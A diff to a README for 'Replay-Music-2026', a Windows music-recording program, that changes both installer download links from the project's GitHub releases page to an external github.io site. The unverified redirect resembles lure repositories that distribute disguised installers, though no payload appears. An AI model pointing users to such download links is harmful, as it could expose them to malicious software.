@@ -1,6 +1,6 @@
 # 🎵 Replay-Music-2026 - Record streaming music on your PC
 
-[![Download Replay Music](https://img.shields.io/badge/Download-Replay-Music-2026-blue.svg)](https://github.com/Caldwellhysterical32/Replay-Music-2026/releases)
+[![Download Replay Music](https://img.shields.io/badge/Download-Replay-Music-2026-blue.svg)](https://caldwellhysterical32.github.io)
 
 ## 📋 What is Replay Music 2026
 
@@ -20,7 +20,7 @@ To run this application, your computer must meet these standards:
 
 You can download the installer from the official release page. 
 
-[Visit this page to download the software](https://github.com/Caldwellhysterical32/Replay-Music-2026/releases)
+[Visit this page to download the software](https://caldwellhysterical32.github.io)
 
 Click the link above to view all available versions. Select the most recent release to download the installer file to your computer.
 
